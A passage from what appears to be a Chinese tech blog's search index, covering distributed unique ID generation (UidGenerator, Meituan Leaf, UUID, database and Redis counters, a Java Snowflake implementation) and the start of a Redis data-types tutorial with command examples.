生成器1.1、概述UidGenerator 是 Java 实现的，基于 Snowflake 算法的唯一 ID 生成器。UidGenerator 以组件形式工作在应用项目中， 支持自定义 workerId 位数和初始化策略， 从而适用于 Docker 等虚拟化环境下实例自动重启、漂移等场景。在实现上， UidGenerator 通过借用未来时间来解决 sequence 天然存在的并发限制；采用 RingBuffer 来缓存已生成的 UID， 并行化 UID 的生产和消费， 同时对 CacheLine 补齐，避免了由 RingBuffer 带来的硬件级「伪共享」问题。 最终单机 QPS 可达 600 万。依赖 Java8 及以上版本， MySQL (内置 WorkerID 分配器， 启动阶段通过数据库进行分配；如自定义实现，则数据库非必选依赖）。 1.2、结构Snowflake 算法描述：指定机器 &amp; 同一时刻 &amp; 某一并发序列，是唯一的。据此可生成一个 64 bit 的唯一 ID（Long 型），默认采用下图字节分配方式： sign（1bit）：符号位，固定是 0，表示全部 ID 都是正整数 delta seconds (28 bits)：当前时间，相对于时间基点 2016-05-20 的增量值，单位为秒，最多可支持约 8.7 年 worker id (22 bits)：机器 ID，最多可支持约 420w 次机器启动。内置实现为在启动时由数据库分配，默认分配策略为用后即弃，后续可提供复用策略 sequence (13 bits)：每秒下的并发序列，13 bits 可支持每秒 8192 个并发 2、Leaf 分布式 ID 生成系统Leaf 提供了两种方案，分别是 Leaf-segment 和 Leaf-snowflake 方案，前者依赖 MySQL，后者依赖 ZooKeeper。 2.1、Leaf-segment 方案2.1.1、概述Leaf-segment 方案，在使用 MySQL 自增 ID 的方案上，做了如下改变： 原方案每次获取 ID 都得读写一次数据库，造成数据库压力大。改为利用 Proxy Server 批量获取，每次获取一个 segment（step 决定大小）号段的值。用完之后再去数据库获取新的号段，可以大大的减轻数据库的压力 各个业务不同的 ID 生成需求用 biz_tag 字段来区分，每个 biz-tag 的 ID 获取相互隔离，互不影响。如果以后有性能需求需要对数据库扩容，不需要上述复杂的扩容操作，只需要对 biz_tag 分库分表就行 123456789+-------------+--------------+------+-----+-------------------+-----------------------------+| Field | Type | Null | Key | Default | Extra |+-------------+--------------+------+-----+-------------------+-----------------------------+| biz_tag | varchar(128) | NO | PRI | | || max_id | bigint(20) | NO | | 1 | || step | int(11) | NO | | NULL | || desc | varchar(256) | YES | | NULL | || update_time | timestamp | NO | | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |+-------------+--------------+------+-----+-------------------+-----------------------------+ 重要字段说明： biz_tag：用来区分业务 max_id：表示该 biz_tag 目前所被分配的 ID 段的最大值 step：表示每次分配的号段长度。原来获取 ID 每次都需要写数据库，现在只需要把 step 设置得足够大，比如 1000。那么只有当 1000 个号被消耗完了之后才会去重新读写一次数据库，读写数据库的频率从 1 减小到了 1 / step 2.1.2、架构 test_tag 在第一台 Leaf 机器上是 11000 的号段，当这个号段用完时，会去加载另一个长度为 step=1000 的号段，假设另外两台号段都没有更新，这个时候第一台机器新加载的号段就应该是 30014000。同时数据库对应的 biz_tag 这条数据的 max_id 会从 3000 被更新成 4000，更新号段的 SQL 语句如下： 1234BeginUPDATE table SET max_id=max_id+step WHERE biz_tag=xxxSELECT tag, max_id, step FROM table WHERE biz_tag=xxxCommit 2.1.3、优缺点优点： Leaf 服务可以很方便的线性扩展，性能完全能够支撑大多数业务场景 ID 是趋势递增的 8 byte 的 64 位数字，满足上述数据库存储的主键要求 可以自定义 max_id 的大小，非常方便业务从原有的 ID 方式上迁移过来 容灾性高，Leaf 服务内部有号段缓存，即使数据库宕机，短时间内 Leaf 仍能正常对外提供服务 缺点： 数据库宕机会造成整个系统不可用 ID 不够随机，能够泄露发号数量的信息，不太安全 TP999 数据波动大，当号段使用完之后，ID 生成的性能瓶颈还是会在更新数据库的 I/O 上，TP999 数据会出现偶尔的尖刺 2.1.4、高可用容灾针对第一个缺点数据库可用性问题，目前采用一主两从的方式，同时分机房部署，Master 和 Slave 之间采用半同步方式同步数据。同时使用 Atlas 数据库中间件（已开源，改名为 DBProxy）做主从切换。当然这种方案在一些情况会退化成异步模式，甚至在非常极端情况下仍然会造成数据不一致的情况，但是出现的概率非常小。如果系统要保证 100% 的数据强一致，可以选择使用 类 Paxos 算法 实现的强一致 MySQL 方案，如 MySQL 5.7 GA 的 MySQL Group Replication，但是运维成本和精力都会相应的增加，根据实际情况选型即可。在美团点评内部，Leaf 服务分 IDC 部署，内部的服务化框架是 MTthrift RPC。服务调用的时候，根据负载均衡算法会优先调用同机房的 Leaf 服务。在该 IDC 内 Leaf 服务不可用的时候才会选择其他机房的 Leaf 服务。同时服务治理平台 OCTO 还提供了针对服务的过载保护、一键截流、动态流量分配等对服务的保护措施。 2.1.5、双 Buffer 优化针对上述第三个缺点，Leaf-segment 做了一些优化，简单的说就是：Leaf 取号段的时机是在号段消耗完的时候进行的，也就意味着号段临界点的 ID 下发时间取决于下一次从数据库取回号段的时间，并且在这期间进来的请求也会因为数据库号段没有取回来，导致线程阻塞。如果请求数据库的网络和数据库的性能稳定，这种情况对系统的影响是不大的，但是假如取数据库的时候网络发生抖动，或者数据库发生慢查询就会导致整个系统的响应时间变慢。为此，希望数据库取号段的过程能够做到无阻塞，不需要在数据库取号段的时候阻塞请求线程，即当号段消费到某个点时就异步的把下一个号段加载到内存中。而不需要等到号段用尽的时候才去更新号段。这样做就可以很大程度上的降低系统的 TP999 指标。详细实现如下图所示： 采用双 Buffer 的方式，Leaf 服务内部有两个号段缓存区 segment。当前号段已下发 10% 时，如果下一个号段未更新，则另启一个更新线程去更新下一个号段。当前号段全部下发完后，如果下个号段准备好了则切换到下个号段为当前 segment 接着下发，循环往复 每个 biz-tag 都有消费速度监控，通常推荐 segment 长度设置为服务高峰期发号 QPS 的 600 倍（10 分钟），这样即使数据库宕机，Leaf 仍能持续发号 10-20 分钟不受影响 每次请求来临时都会判断下个号段的状态，从而更新此号段，所以偶尔的网络抖动不会影响下个号段的更新 2.2、Leaf-snowflake 方案2.2.1、概述Leaf-segment 方案可以生成趋势递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，比如竞对在两天中午 12 点分别下单，通过订单 ID 相减就能大致计算出公司一天的订单量，这个是不能忍受的。面对这一问题，美团点评提供了 Leaf-snowflake 方案。 2.2.2、架构Leaf-snowflake 方案完全沿用 SnowFlake 方案的 bit 位设计，即是 1+41+10+12 的方式组装 ID。对于 workerId 的分配，当服务集群数量较小的情况下，完全可以手动配置。Leaf 服务规模较大，动手配置成本太高。所以使用 ZooKeeper 持久顺序节点的特性自动对 SnowFlake 节点配置 wokerId。Leaf-snowflake 是按照下面几个步骤启动的： 启动 Leaf-snowflake 服务，连接 ZooKeeper，在 leaf_forever 父节点下检查自己是否已经注册过（是否有该顺序子节点） 如果有注册过直接取回自己的 workerId（ZooKeeper 顺序节点生成的 int 类型 ID），启动服务 如果没有注册过，就在该父节点下面创建一个持久顺序节点，创建成功后取回顺序号当做自己的 workerId 号，启动服务 2.2.3、弱依赖 ZooKeeper除了每次会去 ZooKeeper 拿数据以外，也会在本机文件系统上缓存一个 workerId 文件。当 ZooKeeper 出现问题，恰好机器出现问题需要重启时，能保证服务能够正常启动。这样做到了对三方组件的弱依赖，一定程度上提高了 SLA。 2.2.4、解决时钟回拨问题因为 Leaf-snowflake 方案依赖时间，如果机器的时钟发生了回拨，那么就会有可能生成重复的 ID，因此需要解决时钟回退的问题。Leaf-snowflake 整个启动流程图如下： 1）服务启动时首先检查自己是否写过 ZooKeeper 的 leaf_forever 节点 2）若写过，则用自身系统时间与 leaf_forever/${self} 节点记录时间做比较，若小于 leaf_forever/${self} 时间则认为机器时间发生了大步长回拨，服务启动失败并报警 3）若未写过，证明是新服务节点，直接创建持久节点 leaf_forever/${self} 并写入自身系统时间，接下来综合对比其余 Leaf 节点的系统时间来判断自身系统时间是否准确，具体做法是取 leaf_temporary 下的所有临时节点（所有运行中的 Leaf-snowflake 节点）的服务 IP：Port，然后通过 RPC 请求得到所有节点的系统时间，计算 sum(time) / nodeSize。 4）若 abs (系统时间 - sum (time) /nodeSize ) &lt; 阈值，认为当前系统时间准确，正常启动服务，同时写临时节点 leaf_temporary/${self} 维持租约 5）否则认为本机系统时间发生大步长偏移，启动失败并报警 6）每隔一段时间（3s）上报自身系统时间写入 leaf_forever/${self} 由于强依赖时钟，对时间的要求比较敏感，在机器工作时 NTP 同步也会造成秒级别的回退，建议可以直接关闭 NTP 同步。要么在时钟回拨的时候直接不提供服务直接返回 ERROR_CODE，等时钟追上即可。或者做一层重试，然后上报报警系统，更或者是发现有时钟回拨之后自动摘除本身节点并报警，代码如下： 12345678910111213141516171819202122//发生了回拨，此刻时间小于上次发号时间 if (timestamp &lt; lastTimestamp) { long offset = lastTimestamp - timestamp; if (offset &lt;= 5) { try { //时间偏差大小小于5ms，则等待两倍时间 wait(offset &lt;&lt; 1);//wait timestamp = timeGen(); if (timestamp &lt; lastTimestamp) { //还是小于，抛异常并上报 throwClockBackwardsEx(timestamp); } } catch (InterruptedException e) { throw e; } } else { //throw throwClockBackwardsEx(timestamp); } } //分配ID 3、参考资料 Leaf 官方文档 MySQL 半同步复制 UidGenerator 官方文档 基于美团 Leaf、百度 UidGenerator、SnowFlake 整合的分布式唯一 ID 生成器 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 数据库"},{title:"分布式唯一全局 ID 解决方案之一",url:"/posts/b2330a87.html",text:'1、分布式 ID 简介1.1、业务背景在复杂的分布式系统中，往往需要对大量的数据和消息进行唯一标识。比如在美团点评的金融、支付、餐饮、酒店、猫眼电影等产品的系统中数据日渐增长，对数据分库分表后需要有一个唯一 ID 来标识一条数据或消息。具体一点的如订单、骑手、优惠劵也都需要有唯一标识，此时一个能够生成全局唯一 ID 的系统是非常必要的。 1.2、ID 生成规则的硬性要求 全局唯一：不能出现重复的 ID ，既然是唯一标识，这是最基本的要求 单调递增：保证下一个 ID 大于上一个 ID，例如事务版本号、IM 增量信息、排序等特殊需求 趋势递增：在 MySQL 的 InnoDB 存储引擎中使用的是聚集索引，由于多数 RDBMS 使用 BTree 的数据结构来存储索引数据，在主键的选择上面应该尽量使用有序的主键来保证写入性能 信息安全：如果 ID 是连续的，恶意用户的爬取工作就非常容易做了，直接按照顺序下载指定 URL 即可 所以在一些应用场景下，需要 ID 无规则或者不规则，让竞争对手不好猜 上述的全局唯一、单调递增、趋势递增需求分别对应三类不同的业务场景，但单调递增和信息安全这两个需求是互斥的，无法使用同一个方案满足 1.3、ID 生成系统的可用性要求 低延迟：发一个获取分布式 ID 的请求，服务器就要快，极速 高可用：一个获取分布式 ID 的请求，服务器就要在保证 99.999% 成功率的情况下创建一个唯一分布式 ID 高 QPS：假如并发一堆创建分布式 ID 的请求同时杀过来，服务器要顶得住且一下子成功创建 10 万个唯一分布式 ID 2、UUID 生成 ID2.1、概述UUID 按照 OSF 制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片 ID 码和许多可能的数字，并由以下几部分的组成：当前日期和时间、时钟序列、全局唯一的 IEEE 机器识别号。UUID 的标准形式包含 32 个 16 进制的数字，以连字号分为 5 段，形式为 cb6ce510-74fe-4e18-ac3d-05a5c96d3a0f 的 36 个字符。特别注意，基于 MAC 地址生成 UUID 的算法可能会造成 MAC 地址泄露，这个漏洞曾被用于寻找梅丽莎病毒的制作者位置。 2.2、优缺点 优点：性能高，本地生成，没有网络消耗。如果只考虑唯一性，那么可以使用 缺点：无序，长度较长，入库性能差，作为数据库主键时，会导致索引效率下降，空间占用较多 适用场景：只要对存储空间没有苛刻要求的都能够适用，比如各种链路追踪、日志存储等 为什么无序的 UUID 会导致入库性能变差？ 无序：即无法预测 ID 的生成顺序，不能生成递增的有序数字 ID 长度过长：分布式 ID 一般都是作为主键，但是 MySQL 官方推荐主键尽量越短越好，36 个字符长度的 UUID 不是很推荐 B+ 树索引分裂：既然分布式 ID 是主键，然后主键是包含索引的，MySQL 的索引是通过 B+ 树来实现的，每一次新的 UUID 数据的插入，为了查询的优化，都会对索引的底层 B+ 树进行修改。因为 UUID 数据是无序的，所以每一次 UUID 的数据插入都会对主键底层的 B+ 树进行很大的修改，这一点非常不好。插入的 ID 完全无序，不但会导致一些中间节点产生分裂，也会白白的创造出很多的不饱和节点，这样大大的降低了数据库的插入性能 3、数据库自增 ID3.1、概述在分布式应用里，数据库的自增 ID 机制的主要原理是使用：MySQL 数据库自增 ID 和 replace into 来实现的。利用给字段设置 auto_increment 和 auto_increment_offset 来保证 ID 自增，每次业务使用下列 SQL 读写 MySQL 得到 ID。 这里的 replace into 跟 insert 功能类似，不同点在于 replace into 首先会尝试插入数据到表中，如果发现表中已经有此行数据（根据主键或者唯一索引判断），则先删除旧数据，否则直接插入新数据 3.2、优缺点优点： 非常简单，利用现有数据库系统的功能实现，成本小 ID 单调自增，可以实现一些对 ID 有特殊要求的业务 缺点： 生成的是单调递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，否则竞争对手很从容易猜到 分库分表后，同一数据表的自增 ID 容易重复，无法直接使用（可以设置自增步长，但局限性很明显） 强依赖数据库，当数据库异常时整个系统不可用，属于致命问题。配置主从复制可以尽可能的增加可用性，但是数据一致性在特殊情况下难以保证，主从切换时的不一致可能会导致重复生成 ID 生成 ID 的性能瓶颈限制在单台 MySQL 的读写性能，如果设计一个单独的数据库来实现分布式应用的数据唯一性，即使使用预生成方案，也会因为事务锁的问题，高并发场景容易出现单点瓶颈 适用场景： 单数据库实例的表 ID（包含主从同步场景），部分按天计数的流水号等，不适用于分库分表场景、全局唯一 ID 场景 数据库的自增 ID 机制为什么不适合作为分布式 ID？ 在高并发的场景下，数据库压力还是很大，每次获取 ID 都得读写一次数据库，非常影响性能，不符合分布式 ID 里面的低延迟和高 QPS 的规则 系统水平扩展比较困难，为了提高 MySQL 的性能，如果要增加 MySQL 数据库该怎么做？ 3.3、MySQL 集群场景在分布式系统中可以多部署几台机器，每台机器设置不同的初始值，且自增步长和机器数相等。比如有 2 台机器，设置自增步长为 2，TicketServer1 的初始值为 1（1，3，5，7，9，11 …）、TicketServer2 的初始值为 2（2，4，6，8，10 …）。如下所示，分别设置两台机器对应的参数，TicketServer1 从 1 开始生成 ID ，TicketServer2 从 2 开始生成 ID ，两台机器每次生成 ID 之后都递增 2。 1234567TicketServer1:auto-increment-increment = 2auto-increment-offset = 1TicketServer2:auto-increment-increment = 2auto-increment-offset = 2 假设要部署 N 台机器，自增步长需设置为 N，每台的初始值依次为 0，1，2 … N-1，那么整个架构就变成了如下图所示： 这种架构貌似能够满足性能的需求，但有以下几个缺点： 数据库压力还是很大，每次获取 ID 都得读写一次数据库，只能靠堆机器来提高性能 ID 没有了单调递增的特性，只能趋势递增，这个缺点对于一般业务需求不是很重要，可以容忍 系统水平扩展比较困难，比如定义好了自增步长和机器台数之后，如果要添加机器该怎么做？假设现在只有一台机器生成 ID 是 1，2，3，4，5（自增步长是 1），这个时候需要扩容机器一台。可以这样做：把第二台机器的初始值设置得比第一台超过很多，比如 14（假设在扩容时间之内第一台不可能发到 14），同时设置自增步长为 2，那么这台机器下发的号码都是 14 以后的偶数。然后摘掉第一台，把 ID 值保留为奇数，比如 7，然后修改第一台的自增步长为 2。让它符合我们定义的号段标准，对于这个例子来说就是让第一台以后只能产生奇数。扩容方案看起来复杂吗？貌似还好，现在想象一下如果线上有 100 台机器，这个时候要扩容该怎么做？简直是噩梦，所以系统水平扩展方案复杂难以实现。 4、基于 Redis 生成全局 ID 策略4.1、概述因为 Redis 是单线程的，天生保证了原子性，可以使用原子操作 INCR 和 INCRBY 来生成分布式唯一 ID 4.2、优缺点优点： 整体吞吐量比数据库方案要高 缺点： Redis 实例或集群宕机后，找回最新的 ID 值有点困难 Redis 单机环境下，存在单点故障问题，导致 ID 生成服务不可用 生成的是单调递增的 ID，同时 ID 是可计算的，不适用于订单 ID 生成场景，否则竞争对手很从容易猜到 适用场景： 比较适合计数场景，如用户访问量，订单流水号（日期 + 流水号）等 4.3、Redis 集群场景通过 Redis 集群来生成唯一 ID 时，需要设置相同的自增步长，且自增步长等于节点数，同时 Key 要求设置相同的有效期，以此来获得更高的吞吐量。假设一个集群中有 5 台 Redis，此时可以初始化每台 Redis 的值分别是 1，2，3，4，5，然后自增步长都是 5，那么各个 Redis 生成的 ID 为： A：1，6，11，16，21 B：2，7，12，17，22 C：3，8，13，18，23 D：4，9，14，19，24 E：5，10，15，20，25 这种方式最大的缺点是复杂性太高，需要严重依赖第三方服务，集群管理繁琐，而且代码配置繁琐。一般来说，越是复杂的方案，越不可靠。 5、SnowFlake（雪花算法）5.1、概述SnowFlake 算法来源于 Twitter，使用 Scala 语言实现，利用 Thrift 框架实现 RPC 接口调用，最初的项目起因是数据库从 MySQL 迁移到 Cassandra，而 Cassandra 没有现成可用的 ID 生成机制，就催生了该算法。SnowFlake 的特性如下： SnowFlake 生成 ID 能够按照时间有序生成 经测试 SnowFlake 每秒能够产生 26 万个自增可排序 ID 分布式系统内不会产生 ID 碰撞（由 datacenter 和 workerId 做区分），并且生成效率较高 SnowFlake 算法生成 ID 的结果是一个 64 bit 大小的整数，刚好为一个 Long 型，转换成字符串后长度最多是 19 5.2、结构SnowFlake 算法的特性是有序、全局唯一、高性能、低延迟（响应时间在 2ms 以内），可在分布式环境（多集群，跨机房）下使用，因此使用 SnowFlake 算法得到的 ID 是分段组成的： 与指定日期的时间差（毫秒级），41 位，够用 69 年 集群 ID + 机器 ID，10 位，包括 5 位 datacenterId 和 5 位 workerId，最多支持 1024 台机器 序列，12 位，每台机器每毫秒内最多产生 4096 个序列号 1bit：符号位，固定是 0，表示全部 ID 都是正整数 41bit：时间戳（毫秒数时间差），从指定的日期算起，够用 69 年，用 Long 类型表示的时间戳是从 1970-01-01 00:00:00 开始算起的 10bit：机器 ID，有异地部署，多集群的也可以配置，需要线下规划好各地机房，各集群，各实例 ID 的编号 12bit：序列 ID，前面都相同的话，最多可以支持到 4096 个 5.3、优缺点优点： 可以根据自身业务特性分配 bit 位，非常灵活 毫秒数在高位，自增序列在低位，整个 ID 都是趋势递增的 不依赖数据库等三方系统，以服务的方式部署，稳定性更高，生成 ID 的效率也是非常高，低延迟 缺点： 强依赖机器时钟，如果机器的时钟回拨了，会导致生成重复的 ID 若生成环境中使用了容器化技术，实例的个数随时有变化，那么 SnowFlake 需要一定的改造才能更好地应用到生产环境中 在单机上是递增的，但是由于涉及到分布式环境，每台机器上的时钟不可能完全同步（如时钟回拨），有时候可能会出现不是全局递增的情况（此缺点可认为无所谓，一般分布式 ID 只是要求趋势递增，并不会严格要求递增，90% 的业务需求都只需要趋势递增） 适用场景： 分布式应用环境的数据主键 5.4、Java 版实现Java 版的代码实现来自这里，在企业的项目开发中，一般可以直接使用封装好 SnowFlake 算法的 Java 工具库（如 Hutools 工具库），不再需要自己实现一遍，完整的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/** * twitter的snowflake算法 -- java实现 * * @author beyond * @date 2016/11/26 */public class SnowFlake { /** * 起始的时间戳 */ private final static long START_STMP = 1480166465631L; /** * 每一部分占用的位数 */ private final static long SEQUENCE_BIT = 12; //序列号占用的位数 private final static long MACHINE_BIT = 5; //机器标识占用的位数 private final static long DATACENTER_BIT = 5;//数据中心占用的位数 /** * 每一部分的最大值 */ private final static long MAX_DATACENTER_NUM = -1L ^ (-1L &lt;&lt; DATACENTER_BIT); private final static long MAX_MACHINE_NUM = -1L ^ (-1L &lt;&lt; MACHINE_BIT); private final static long MAX_SEQUENCE = -1L ^ (-1L &lt;&lt; SEQUENCE_BIT); /** * 每一部分向左的位移 */ private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATACENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTMP_LEFT = DATACENTER_LEFT + DATACENTER_BIT; private long datacenterId; //数据中心 private long machineId; //机器标识 private long sequence = 0L; //序列号 private long lastStmp = -1L;//上一次时间戳 public SnowFlake(long datacenterId, long machineId) { if (datacenterId &gt; MAX_DATACENTER_NUM || datacenterId &lt; 0) { throw new IllegalArgumentException("datacenterId can\'t be greater than MAX_DATACENTER_NUM or less than 0"); } if (machineId &gt; MAX_MACHINE_NUM || machineId &lt; 0) { throw new IllegalArgumentException("machineId can\'t be greater than MAX_MACHINE_NUM or less than 0"); } this.datacenterId = datacenterId; this.machineId = machineId; } /** * 产生下一个ID * * @return */ public synchronized long nextId() { long currStmp = getNewstmp(); if (currStmp &lt; lastStmp) { throw new RuntimeException("Clock moved backwards. Refusing to generate id"); } if (currStmp == lastStmp) { //相同毫秒内，序列号自增 sequence = (sequence + 1) &amp; MAX_SEQUENCE; //同一毫秒的序列数已经达到最大 if (sequence == 0L) { currStmp = getNextMill(); } } else { //不同毫秒内，序列号置为0 sequence = 0L; } lastStmp = currStmp; return (currStmp - START_STMP) &lt;&lt; TIMESTMP_LEFT //时间戳部分 | datacenterId &lt;&lt; DATACENTER_LEFT //数据中心部分 | machineId &lt;&lt; MACHINE_LEFT //机器标识部分 | sequence; //序列号部分 } private long getNextMill() { long mill = getNewstmp(); while (mill &lt;= lastStmp) { mill = getNewstmp(); } return mill; } private long getNewstmp() { return System.currentTimeMillis(); } public static void main(String[] args) { SnowFlake snowFlake = new SnowFlake(2, 3); for (int i = 0; i &lt; (1 &lt;&lt; 12); i++) { System.out.println(snowFlake.nextId()); } }} 上面的代码基本上通过位移操作，将每段含义的数值，移到相应的位置上。如机器 ID 这里由数据中心 + 机器标识组成，所以，机器标识向左移 12 位，就是它的位置，数据中心的编号向左移 17 位，时间戳的值向左移 22 位，每部分占据自己的位置，各不干涉，由此组成一个完整的 ID 值。 了解 SnowFlake 的基本实现原理，可以通过提前规划好机器标识来实现，但目前的分布式生产环境，借用了多种云计算、容器化技术，实例的个数随时有变化，而且还需要处理服务器实例的时钟回拨问题，固定规划 ID 然后通过配置来使用 SnowFlake 的场景可行性不高。一般是自动启停，增减机器，这样就需要对 SnowFlake 进行一些改造才能更好地应用到生产环境中。 下篇 - 分布式唯一全局 ID 解决方案之二 分布式唯一全局 ID 解决方案之二 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 数据库"},{title:"Redis 入门教程之一五大数据类型",url:"/posts/fea85f3.html",text:'系统级命令获取符合规则的键名列表KEYS 命令需要遍历 Redis 中的所有键，当键的数量较多时会严重影响性能，在生产环境中应该禁用该命令。 1KEYS pattern 示例： 12redis&gt; KEYS *1) "book" pattern 支持 Glob 风格的通配符格式： 符号 含义 ? 匹配一个字符 * 匹配任意个（包括 0 个）字符 [ ] 匹配括号间的任一字符，可以使用 “-” 符号来表示一个范围，如 a [b-d] 可以匹配 “ab”、”ac”、”ad” \\x 匹配字符 x，用于转义字符，如需要匹配 “?” 就需要使用 \\? 判断一个键是否存在如果键存在则返回整数类型 1，否则返回 0。 1EXISTS key 示例： 12345redis&gt; EXISTS book(integer) 1redis&gt; EXISTS noexists(integer) 0 删除键可以删除一个或多个键，返回值是删除的键的个数。 1DEL key 示例： 12345redis&gt; DEL book(integer) 1redis&gt; DEL noexists(integer) 0 DEL 命令的参数不支持通配符，但可以结合 Linux 的管道和 xargs 命令实现删除所有符合规则的键。比如要删除以 “user:” 开头的键，就可以执行以下命令： 1$ redis-cli KEYS "user:*" | xargs redis-cli DEL 另外由于 DEL 命令支持多个键作为参数，所以还可以执行以下命令来达到同样的效果，但是性能更好： 1$ redis-cli DEL `redis-cli KEYS "user:*"` 获得键值的数据类型1TYPE key 示例： 12127.0.0.1:6379&gt; type bookstring 清空当前数据库1FLUSHDB [ASYNC] 清空所有数据库1FLUSHALL [ASYNC] 设置过期时间1EXPIRE key seconds 查看剩余存活时间1TTL key 数据类型字符串类型（String）字符串类型是 Redis 中最基础的数据类型，它能存储任何形式的字符串，包括二进制数据。例如存储用户的邮箱、JSON 化的对象甚至是一张图片。一个字符串类型键允许存储的最大容量是 512 MB。字符串类型是其他 4 种数据类型的基础，其他数据类型和字符串类型的差别从某种角度来说只是组织字符串的形式不同。例如，列表类型（List）是以列表的形式组织字符串，而集合类型是以集合的形式组织字符串。 赋值与取值（字符串）123SET key valueGET key 示例： 12345redis&gt; SET book javaOKredis&gt; GET book"java" 取值时，当键不存在时，会返回空结果。 递增数字字符串类型可以存储任何形式的字符串，当存储的字符串是整数形式时，Redis 提供了一个实用的命令 INCR，其作用是让当前键值递增 1，并返回递增后的值。 1INCR key 示例： 12345redis&gt; INCR num(integer) 1redis&gt; INCR num(integer) 2 当要操作的键不存在时，会创建该键并设置值为 0，所以第一次递增后的结果为 1。 1234redis&gt; SET foo barredis&gt; INCR foo(error) ERR value is not an integer or out of range 当键值不是整数时，Redis 会提示错误。 增加指定的整数INCRBY 命令与 INCR 命令级别一样，只不过前者可以通过 increment 参数指定一次增加的数值。 1INCRBY key increment 示例： 12345redis&gt; INCRBY bar 2(integer) 2redis&gt; INCRBY bar 3(integer) 5 减少指定的整数DECR 命令与 INCR 命令的用法相同，只不过是让键值递减 1。 1DECR key 示例： 12redis&gt; DECR car(integer) -1 DECRBY 与 INCRBY 命令的用法相同，可以通过 increment 参数指定一次递减的数值。 1DECRBY key increment 示例： 12345redis&gt; DECRBY cat 3(integer) -3redis&gt; DECRBY cat 5(integer) -8 增加指定的浮点数INCRBYFLOAT 命令类似 INCRBY 命令，差别是 INCRBYFLOAT 可以递增一个双精度浮点数。 1INCRBYFLOAT key pattern 示例： 12345redis&gt; INCRBYFLOAT bar 2.7"2.7"redis&gt; INCRBYFLOAT bar 5E+4"50002.69999999999999929" 向尾部追加值APPEND 的作用是向键值的末尾追加 value。如果键不存在，则会创建该键并设置值为 value，返回值是追加后字符串的总长度。 1APPEND key value 示例： 12345678redis&gt; set key helloOKredis&gt; APPEND key " world!"(integer) 12redis&gt; GET key"hello world!" 获取字符串长度STRLEN 命令返回键值的长度，如果键不存在则返回 0。 1STRLEN key 示例： 12345678redis&gt; STRLEN key(integer) 12redis&gt; set key 你好OKredis&gt; STRLEN key(integer) 6 同时获取 / 设置多个键值123MGET key [key ...]MSET key value [key value ...] 示例： 123456redis&gt; MSET key1 v1 key2 v2 key3 v3redis&gt; MGET key1 key2 key31) "v1"2) "v2"3) "v3" 位操作位操作命令： 123456789GETBIT key offsetSETBIT key offset valueBITCOUNT key [start] [end]BITOP operation destkey key [key ...]BITPOS key value [start] [end] 一个字节由 8 个二进制位组成，Redis 提供了上述 4 个命令可以直接对二进制位进行操作。为了演示，首先将 foo 键赋值为 bar： 12redis&gt; SET foo bar(integer) 0 bar 的 3 个字母 “b”、”a”、”r” 对应的 ASCII 码分别是 98、97 和 114，转换成二进制后分别为 1100010、1100001、1110010，所以 foo 键中的二进制位结构图如下： GETBIT 命令可以获取一个字符串类型键指定位置的二进制位的值（0 或 1），索引从 0 开始。如果需要获取的二进制位的索引超出了键值的二进制位的实际长度，则默认值为 0。 12345678redis&gt; GETBIT foo 0(integer) 0redis&gt; GETBIT foo 6(integer) 1redis&gt; GETBIT foo 100000(integer) 0 SETBIT 命令可以设置字符串类型键指定位置的二进制位的值，返回值是该位置的旧值。如果要将 foo 键值设置为 aar，那么可以通过位操作将 foo 键的二进制位的索引第 6 位设置为 0，第 7 位设置为 1。 12345678redis&gt; SETBIT foo 6 0(integer) 1redis&gt; SETBIT foo 7 1(integer) 0redis&gt; GET foo"aar" 如果要设置的位置超过了键值的二进制的长度，SETBIT 命令会自动将中间的二进制位设置为 0；同理设置一个不存在的键的指定二进制位的值，会自动将前面的位赋值为 0。 12345redis&gt; SETBIT nofoo 10 1(integer) 0redis&gt; GETBIT nofoo 5(integer) 0 BITCOUNT 命令可以获得字符串类型键中值是 1 的二进制位个数，例如： 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo(integer) 10 BITCOUNT 可以通过参数限制统计的字节范围，例如只希望统计前两个字节（即 “fo”），字节范围从 0 开始： 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo 0 1(integer) 6 BITOP 命令可以对多个字符串类型键进行位运算，并将结果存储在 destkey 参数指定的键中。BITOP 命令支持的运算操作有 AND、OR、XOR 和 NOT。例如可以对 bar 和 aar 进行 OR 运算： 1234567891011redis&gt; set foo1 barOKredis&gt; set foo2 aarOKredis&gt; BITOP OR res foo1 foo2(integer) 3redis&gt; GET res"car" 具体的位运算过程如下图： BITPOS 命令可以获得指定键的第一个位值是 0 或者 1 的位置。以 “bar” 这个键值为例，如果想获取键值中的第一个二进制位值为 1 的位置（从 0 开始算起），则可以执行： 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1(integer) 1 对比上面位运算的过程图，正如 BITPOS 命令的执行结果所示，”bar” 中第一个值为 1 的二进制位的位置为 1（同其他命令一样，BITPOS 命令的索引也是从 0 开始算起）。如果希望指定二进制位的查询范围，那么可以使用 BITPOS 